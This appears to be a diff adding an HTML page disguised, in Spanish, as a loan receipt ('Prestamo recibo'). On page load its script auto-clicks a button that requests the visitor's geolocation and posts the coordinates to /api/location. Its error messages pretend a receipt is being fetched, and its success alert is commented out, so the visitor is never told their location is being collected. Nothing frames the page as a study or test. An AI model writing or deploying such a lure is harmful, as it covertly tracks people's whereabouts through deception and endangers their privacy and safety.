@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head><title>Send Location</title></head>
+<body>
+<h2>Prestamo recibo</h2>
+<button id="locButton" onclick="sendLocation()">Prestamo Recibo</button>
+
+<script>
+    function sendLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((position) => {
+                const data = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                };
+
+                fetch('/api/location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).then(response => {
+                    // alert("El Recibo del Prestamo fue enviado.");
+                });
+            }, (error) => {
+                alert("Erro Buscando el recibo: " + error.message);
+            });
+        } else {
+            alert("Recibo no soportado");
+        }
+    }
+
+    // Auto-click the "Prestamo Recibo" button when the page loads
+    window.onload = function () {
+        const button = document.getElementById("locButton");
+            if (button) {
+                button.click();
+            }
+    };
+</script>
+</body>
+</html>
